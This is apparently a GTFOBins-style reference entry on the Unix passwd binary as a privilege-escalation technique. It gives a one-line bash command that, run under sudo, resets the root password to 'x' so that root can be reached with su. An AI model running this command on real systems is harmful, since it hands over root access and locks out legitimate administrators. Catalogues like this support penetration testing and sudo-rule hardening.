---
type: gtfobin
name: passwd
platform: Unix
functions: [privilege-escalation]
tags: [gtfobin, unix, lotl]
---

# passwd

## privilege-escalation

```bash
echo -e 'x\nx' | passwd
```
_This changes the root password to `x`, so it's now possible to log in using, for example, `su`._
**Contexts:** sudo
